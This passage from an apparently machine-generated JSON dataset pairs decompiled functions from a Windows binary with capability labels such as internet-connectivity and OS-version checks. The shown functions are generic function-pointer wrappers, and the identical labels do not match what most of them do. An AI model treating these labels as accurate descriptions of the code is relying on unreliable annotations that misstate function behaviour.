        "decompiled_code": "\nuint64_t fcn.0005f31c(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uint in_stack_00000028;\n    \n    uVar4 = fcn.0005f0c0(arg1);\n    if (uVar4 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x4d) || (pcVar2 = *(piVar1 + 0x13),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar4 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar2)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar4 = uVar3;\n            if ((uVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                uVar4 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 282
    },
    "0005f3a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0005f3a4(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uint in_stack_00000028;\n    \n    uVar4 = fcn.0005f0c0(arg1);\n    if (uVar4 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x55) || (pcVar2 = *(piVar1 + 0x15),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar4 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar2)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar4 = uVar3;\n            if ((uVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                uVar4 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 282
    },
    "0005f42c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0005f42c(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    \n    uVar4 = fcn.0005f0c0(arg1);\n    if (uVar4 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x65) || (pcVar2 = *(piVar1 + 0x19),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar4 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar2)(arg1, arg2, arg3, arg4);\n            uVar4 = uVar3;\n            if ((uVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                uVar4 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 265
    },
    "0005f4ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0005f4ac(int64_t *arg1, int64_t *arg2, uint *arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    uint in_stack_00000028;\n    \n    uVar5 = fcn.0005f0c0(arg1);\n    if (uVar5 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x6d) || (pcVar2 = *(piVar1 + 0x1b),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar5 = 0x21590001;\n        }\n        else {\n            uVar4 = (*pcVar2)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar5 = uVar4;\n            if ((uVar4 == 0) && (*arg2 != 0)) {\n                iVar3 = *arg1;\n                fcn.0002f23c(iVar3 + 0x28);\n                *(iVar3 + 0x24) = *(iVar3 + 0x24) + 1;\n                fcn.0002f2a4(iVar3 + 0x28);\n            }\n            else {\n                if (*(*arg1 + 0x20) != 0) {\n                    uVar5 = 0x21590006;\n                }\n                fcn.00031108(*arg1 + 8);\n                *arg2 = 0;\n                *arg3 = 0;\n            }\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 396
    },
    "0005f564": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0005f564(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uint in_stack_00000028;\n    \n    uVar4 = fcn.0005f0c0(arg1);\n    if (uVar4 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x7d) || (pcVar2 = *(piVar1 + 0x1f),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar4 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar2)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar4 = uVar3;\n            if ((uVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                uVar4 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 282
    },
    "0005f5ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0005f5ec(int64_t *arg1, int64_t *arg2, uint *arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    uint in_stack_00000028;\n    uint in_stack_00000030;\n    \n    uVar5 = fcn.0005f0c0(arg1);\n    if (uVar5 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x8d) || (pcVar2 = *(piVar1 + 0x23),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar5 = 0x21590001;\n        }\n        else {\n            uVar4 = (*pcVar2)(arg1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030);\n            uVar5 = uVar4;\n            if ((uVar4 == 0) && (*arg2 != 0)) {\n                iVar3 = *arg1;\n                fcn.0002f23c(iVar3 + 0x28);\n                *(iVar3 + 0x24) = *(iVar3 + 0x24) + 1;\n                fcn.0002f2a4(iVar3 + 0x28);\n            }\n            else {\n                if (*(*arg1 + 0x20) != 0) {\n                    uVar5 = 0x21590006;\n                }\n                fcn.00031108(*arg1 + 8);\n                *arg2 = 0;\n                *arg3 = 0;\n            }\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 411
    },
    "0005f6bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0005f6bc(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int64_t arg2_00;\n    uint32_t auStackX32 [2];\n    \n    iVar3 = fcn.0005f0c0(arg1);\n    if (iVar3 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x75) || (pcVar2 = *(piVar1 + 0x1d),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            iVar3 = 0x21590001;\n        }\n        else {\n            iVar3 = (*pcVar2)(arg1, arg2);\n            if ((iVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                iVar3 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    if (iVar3 == 0x21590001) {\n        arg2_00 = fcn.0005f9ec(arg2, auStackX32);\n        if (arg2_00 == 0) {\n            iVar3 = 0x21590004;\n        }\n        else {\n            iVar3 = fcn.0005f42c(arg1, arg2_00, auStackX32[0], arg3);\n            fcn.0002fc50(arg2_00);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 362
    },
    "0005f778": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0005f778(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int64_t arg2_00;\n    uint32_t auStack56 [4];\n    \n    iVar3 = fcn.0005f0c0(arg1);\n    if (iVar3 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x85) || (pcVar2 = *(piVar1 + 0x21),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            iVar3 = 0x21590001;\n        }\n        else {\n            iVar3 = (*pcVar2)(arg1, arg2, arg3, arg4);\n            if ((iVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                iVar3 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    if (iVar3 == 0x21590001) {\n        arg2_00 = fcn.0005f9ec(arg2, auStack56);\n        if (arg2_00 == 0) {\n            iVar3 = 0x21590004;\n        }\n        else {\n            iVar3 = fcn.0005f564(arg1, arg2_00, auStack56[0], arg3);\n            fcn.0002fc50(arg2_00);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 366
    },
    "0005f848": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0005f848(char *arg1)\n\n{\n    int64_t *piVar1;\n    char cVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int64_t *piVar7;\n    char *pcVar8;\n    \n    LOCK();\n    iVar3 = *0x87c38 + 1;\n    iVar5 = *0x87c38 + 1;\n    *0x87c38 = iVar3;\n    if (iVar5 < 2) {\n        fcn.00058e08();\n        piVar7 = *0x78708;\n        iVar5 = 0;\n        iVar3 = **0x78708;\n        piVar1 = *0x78708;\n        while (iVar3 != 0) {\n            iVar4 = (**(*(piVar1 + 0xc) + 4))();\n            if (iVar4 != 0) {\n                if (0 < iVar5) {\n                    piVar7 = piVar7 + 0xc;\n                    do {\n                        (**(*piVar7 + 0xc))();\n                        piVar7 = piVar7 + 0x14;\n                        iVar5 = iVar5 + -1;\n                    } while (iVar5 != 0);\n                }\n                return 0x21590007;\n            }\n            iVar5 = iVar5 + 1;\n            piVar1 = piVar7 + iVar5 * 0x14;\n            iVar3 = *piVar1;\n        }\n        if (arg1 != NULL) {\n            do {\n                if (*arg1 == '\\0') break;\n                uVar6 = 0xffffffffffffffff;\n                pcVar8 = arg1;\n                do {\n                    if (uVar6 == 0) break;\n                    uVar6 = uVar6 - 1;\n                    cVar2 = *pcVar8;\n                    pcVar8 = pcVar8 + 1;\n                } while (cVar2 != '\\0');\n                arg1 = arg1 + ~uVar6;\n            } while (arg1 != NULL);\n        }\n        fcn.0005e3c0();\n        fcn.0005fa80();\n        fcn.00060820();\n        fcn.0005ed24();\n    }\n    return 0;\n}\n",
        "token_count": 506
    },
    "0005f8fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0005f8fc(void)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int64_t **ppiVar4;\n    int64_t iVar5;\n    \n    LOCK();\n    *0x87c38 = *0x87c38 + -1;\n    if (*0x87c38 == 0) {\n        ppiVar4 = 0x78708;\n        do {\n            piVar2 = *ppiVar4;\n            if (piVar2 != NULL) {\n                iVar5 = 0;\n                iVar3 = *piVar2;\n                piVar1 = piVar2;\n                while (iVar3 != 0) {\n                    (**(*(piVar1 + 0xc) + 0xc))();\n                    iVar5 = iVar5 + 1;\n                    piVar1 = piVar2 + iVar5 * 0x14;\n                    iVar3 = *piVar1;\n                }\n                if (ppiVar4[-1] != NULL) {\n                    ppiVar4[-1] = NULL;\n                    *ppiVar4 = NULL;\n                }\n            }\n            ppiVar4 = ppiVar4 + 2;\n        } while (ppiVar4 < 0x787a8);\n        fcn.0005e3cc();\n        fcn.0005fa8c();\n        fcn.0006082c();\n        fcn.0005ed30();\n        fcn.00058e14();\n    }\n    return;\n}\n",
        "token_count": 332
    },
    "0005fa98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0005fa98(int64_t **arg1, int64_t *arg2, ulong arg3, ulong arg4)\n\n{\n    char cVar1;\n    char *arg1_00;\n    uchar *puVar2;\n    int64_t iVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    int64_t iVar8;\n    ulong in_stack_00000028;\n    uint in_stack_00000030;\n    \n    iVar8 = 0;\n    *arg1 = NULL;\n    iVar3 = *arg2;\n    piVar4 = arg2;\n    do {\n        if (iVar3 == 0) {\n            return 0x21590005;\n        }\n        arg1_00 = fcn.0002fc74(*piVar4);\n        if (arg1_00 == NULL) {\n            return 0x21590004;\n        }\n        puVar2 = fcn.00061a86(arg1_00, 0x2e);\n        if (puVar2 != NULL) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        iVar3 = fcn.0005fa5c(arg1_00);\n        if (iVar3 == 0) {\n            fcn.0002fc50(arg1_00);\n            iVar6 = 0x21590005;\n            if (*0x786e0 == 0) {\ncode_r0x0005fbe2:\n                if ((*0x786f0 != 0) &&\n                   (iVar6 = (**(*0x786f0 + 0x14))(arg1, *piVar4, arg3, arg4, in_stack_00000028, in_stack_00000030), \n                   iVar6 == 0)) {\n                    iVar3 = *0x786f0;\n                }\n            }\n            else {\n                iVar6 = (**(*0x786e0 + 0x14))(arg1, *piVar4, arg3, arg4, in_stack_00000028, in_stack_00000030);\n                if (iVar6 == 0) {\n                    iVar3 = *0x786e0;\n                }\n                if (iVar6 == 0x21590005) goto code_r0x0005fbe2;\n            }\n            if (iVar3 != 0) goto code_r0x0005fc6b;\n            if (iVar6 != 0x21590005) {\n                return iVar6;\n            }\n        }\n        else {\n            if (puVar2 == NULL) {\n                iVar5 = -1;\n                pcVar7 = arg1_00;\n                do {\n                    if (iVar5 == 0) break;\n                    iVar5 = iVar5 + -1;\n                    cVar1 = *pcVar7;\n                    pcVar7 = pcVar7 + 1;\n                } while (cVar1 != '\\0');\n                iVar6 = ~iVar5 - 1;\n            }\n            else {\n                iVar6 = puVar2 - arg1_00;\n            }\n            fcn.0002fc50(arg1_00);\n            iVar6 = (**(iVar3 + 0x14))(arg1, iVar6 + *piVar4, arg3, arg4, in_stack_00000028, in_stack_00000030);\n        }\n        if (iVar3 != 0) {\ncode_r0x0005fc6b:\n            if (iVar6 != 0) {\n                return iVar6;\n            }\n            if (*arg1 != NULL) {\n                piVar4 = fcn.0002fbc4(0x30);\n                if (piVar4 != NULL) {\n                    *piVar4 = iVar3;\n                    *(piVar4 + 4) = 0;\n                    *(piVar4 + 0x24) = 0;\n                    fcn.00031000(piVar4 + 1);\n                    fcn.0002f1ec(piVar4 + 5);\n                    **arg1 = piVar4;\n                    iVar6 = fcn.00058e7c(*arg1, 2);\n                    if (iVar6 != 0) {\n                        return 0;\n                    }\n                    fcn.0003105c(piVar4 + 1);\n                    fcn.0002f214(piVar4 + 5);\n                    fcn.0002fc50(piVar4);\n                }\n                (**(iVar3 + 0x1c))(*arg1, 0);\n                (**(iVar3 + 0x24))(*arg1, 0);\n                *arg1 = NULL;\n                return 0x21590004;\n            }\n            (**(iVar3 + 0x1c))(0, 0);\n            (**(iVar3 + 0x24))(*arg1, 0);\n            return -1;\n        }\n        iVar8 = iVar8 + 1;\n        piVar4 = arg2 + iVar8;\n        iVar3 = *piVar4;\n    } while( true );\n}\n",
        "token_count": 1105
    },
    "0005feb8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0005feb8(int64_t **arg1, ulong *arg2, ulong arg3)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint64_t uVar6;\n    int64_t *arg1_00;\n    \n    uVar6 = fcn.0005fe58(arg1);\n    if (uVar6 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x35) || (pcVar2 = *(piVar1 + 0xd),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar6 = 0x21590001;\n        }\n        else {\n            uVar4 = (*pcVar2)(arg1, arg2, arg3);\n            uVar6 = uVar4;\n            if (uVar4 == 0) {\n                arg1_00 = fcn.0002fbc4(0x30);\n                if (arg1_00 == NULL) {\n                    fcn.00031108(*arg1 + 1);\n                    (**(**arg1 + 0x24))(*arg2, 0);\n                    *arg2 = 0;\n                    return 0x21590004;\n                }\n                iVar3 = **arg1;\n                *(arg1_00 + 4) = 0;\n                *(arg1_00 + 0x24) = 0;\n                *arg1_00 = iVar3;\n                fcn.00031000(arg1_00 + 1);\n                fcn.0002f1ec(arg1_00 + 5);\n                **arg2 = arg1_00;\n                iVar5 = fcn.00058e7c(*arg2, 2);\n                if (iVar5 == 0) {\n                    fcn.0003105c(arg1_00 + 1);\n                    fcn.0002f214(arg1_00 + 5);\n                    fcn.0002fc50(arg1_00);\n                    (**(**arg1 + 0x24))(*arg2, 0);\n                    *arg2 = 0;\n                    uVar6 = 0x21590004;\n                }\n            }\n            else if (*(*arg1 + 4) != 0) {\n                uVar6 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 1);\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 567
    },
    "00060208": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00060208(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    \n    uVar4 = fcn.0005fe58(arg1);\n    if (uVar4 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x4d) || (pcVar2 = *(piVar1 + 0x13),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar4 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar2)(arg1, arg2, arg3, arg4);\n            uVar4 = uVar3;\n            if ((uVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                uVar4 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 262
    },
    "00060288": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00060288(int64_t *arg1, int64_t *arg2, uint *arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    uint in_stack_00000028;\n    \n    uVar5 = fcn.0005fe58(arg1);\n    if (uVar5 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x55) || (pcVar2 = *(piVar1 + 0x15),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar5 = 0x21590001;\n        }\n        else {\n            uVar4 = (*pcVar2)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar5 = uVar4;\n            if ((uVar4 == 0) && (*arg2 != 0)) {\n                iVar3 = *arg1;\n                fcn.0002f23c(iVar3 + 0x28);\n                *(iVar3 + 0x24) = *(iVar3 + 0x24) + 1;\n                fcn.0002f2a4(iVar3 + 0x28);\n            }\n            else {\n                if (*(*arg1 + 0x20) != 0) {\n                    uVar5 = 0x21590006;\n                }\n                fcn.00031108(*arg1 + 8);\n                *arg2 = 0;\n                *arg3 = 0;\n            }\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 390
    },
    "00060340": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00060340(int64_t *arg1, ulong arg2, ulong arg3, int64_t *arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    uint *in_stack_00000028;\n    uint in_stack_00000030;\n    uint in_stack_00000038;\n    \n    uVar5 = fcn.0005fe58(arg1);\n    if (uVar5 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x5d) || (pcVar2 = *(piVar1 + 0x17),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar5 = 0x21590001;\n        }\n        else {\n            uVar4 = (*pcVar2)(arg1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030, in_stack_00000038);\n            uVar5 = uVar4;\n            if ((uVar4 == 0) && (*arg4 != 0)) {\n                iVar3 = *arg1;\n                fcn.0002f23c(iVar3 + 0x28);\n                *(iVar3 + 0x24) = *(iVar3 + 0x24) + 1;\n                fcn.0002f2a4(iVar3 + 0x28);\n            }\n            else {\n                if (*(*arg1 + 0x20) != 0) {\n                    uVar5 = 0x21590006;\n                }\n                fcn.00031108(*arg1 + 8);\n                *arg4 = 0;\n                *in_stack_00000028 = 0;\n            }\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 427
    },
    "0006041c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0006041c(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uint in_stack_00000028;\n    \n    uVar4 = fcn.0005fe58(arg1);\n    if (uVar4 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x75) || (pcVar2 = *(piVar1 + 0x1d),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar4 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar2)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar4 = uVar3;\n            if ((uVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                uVar4 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 279
    },
    "000604a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000604a4(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uint in_stack_00000028;\n    \n    uVar4 = fcn.0005fe58(arg1);\n    if (uVar4 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x7d) || (pcVar2 = *(piVar1 + 0x1f),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar4 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar2)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar4 = uVar3;\n            if ((uVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                uVar4 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 280
    },
    "0006052c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0006052c(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int64_t arg2_00;\n    uint32_t auStackX32 [2];\n    \n    iVar3 = fcn.0005fe58(arg1);\n    if (iVar3 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x85) || (pcVar2 = *(piVar1 + 0x21),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            iVar3 = 0x21590001;\n        }\n        else {\n            iVar3 = (*pcVar2)(arg1, arg2);\n            if ((iVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                iVar3 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    if (iVar3 == 0x21590001) {\n        arg2_00 = fcn.0005f9ec(arg2, auStackX32);\n        if (arg2_00 == 0) {\n            iVar3 = 0x21590004;\n        }\n        else {\n            iVar3 = fcn.00060208(arg1, arg2_00, auStackX32[0], arg3);\n            fcn.0002fc50(arg2_00);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 356
    },
    "000605ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.000605ec(int64_t *arg1, ulong arg2, int64_t *arg3, uint *arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint32_t in_stack_00000028;\n    uint in_stack_00000030;\n    uint64_t in_stack_ffffffffffffff88;\n    uint32_t auStack88 [6];\n    \n    iVar3 = fcn.0005fe58(arg1);\n    if (iVar3 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x8d) || (pcVar2 = *(piVar1 + 0x23),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            iVar3 = 0x21590001;\n        }\n        else {\n            iVar3 = (*pcVar2)(arg1, arg2, arg3, arg4, in_stack_ffffffffffffff88 & 0xffffffff00000000 | in_stack_00000028\n                              , in_stack_00000030);\n            if ((iVar3 == 0) && (*arg3 != 0)) {\n                iVar4 = *arg1;\n                fcn.0002f23c(iVar4 + 0x28);\n                *(iVar4 + 0x24) = *(iVar4 + 0x24) + 1;\n                fcn.0002f2a4(iVar4 + 0x28);\n            }\n            else {\n                if (*(*arg1 + 0x20) != 0) {\n                    iVar3 = 0x21590006;\n                }\n                fcn.00031108(*arg1 + 8);\n                *arg3 = 0;\n                *arg4 = 0;\n            }\n        }\n    }\n    if (iVar3 == 0x21590001) {\n        iVar4 = fcn.0005f9ec(arg2, auStack88);\n        if (iVar4 == 0) {\n            iVar3 = 0x21590004;\n        }\n        else {\n            iVar3 = fcn.00060340(arg1, iVar4, auStack88[0], arg3);\n            fcn.0002fc50(iVar4);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 521
    },
    "00060b2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
